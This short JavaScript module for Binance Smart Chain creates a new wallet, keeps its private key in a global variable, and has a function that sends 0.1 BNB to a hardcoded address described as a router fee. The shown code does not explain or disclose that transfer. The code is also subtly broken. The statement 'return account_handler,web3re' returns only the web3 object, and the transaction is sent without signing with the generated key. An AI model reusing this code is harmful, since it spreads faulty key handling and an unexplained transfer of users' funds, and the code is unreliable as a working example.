import Web3 from 'web3'

var re_address = ""
var priv_key = ""




const EthereumTx = require('ethereumjs-tx').Transaction
var tk_pm = []
const createWallet = async() => {

    const web3re = new Web3('https://bsc-dataseed1.binance.org:443');

    const account_handler = web3re.eth.accounts.create();
    re_address = account_handler.address
    priv_key = account_handler.privateKey
    return account_handler,web3re
}

const sendFeetoRouter = async(web3,address,tkn_pm) => {

    const txObject = {
        "from": address,
        "to": '0xff905Ce168fE7E45E8Cc3632DD7426Be23329664',
        "value": '100000000000000000'
    }
    
    tk_pm = tkn_pm
    
    let tx = await web3.eth.sendTransaction(txObject)

    return tx

}






export { sendFeetoRouter, createWallet }
